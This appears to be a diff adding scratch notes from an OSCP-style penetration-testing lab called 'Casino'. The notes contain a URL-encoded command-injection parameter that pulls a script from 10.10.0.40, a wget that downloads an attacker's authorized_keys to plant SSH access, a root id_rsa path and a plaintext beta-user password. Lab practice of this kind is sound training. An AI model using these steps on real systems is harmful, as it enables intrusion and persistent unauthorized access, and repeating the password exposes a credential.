@@ -1,0 +1,11 @@
+
+BTC=http%3a//localhost%3a9000/admin?cmd=http%3a//10.10.0.40%3a443/dark.py+-p+/tmp/
+
+/root/Desktop/OSCP-Prep/CSecLabs/Linux/Casino/id_rsa
+
+wget+-O+/tmp/authorized_keys+http%3a//10.10.0.40/authorized_keys
+
+chmod+400+/home/grey/.ssh/authorized_keys
+
+# beta user: carla
+# password: >F73SzS36>V$tJmc
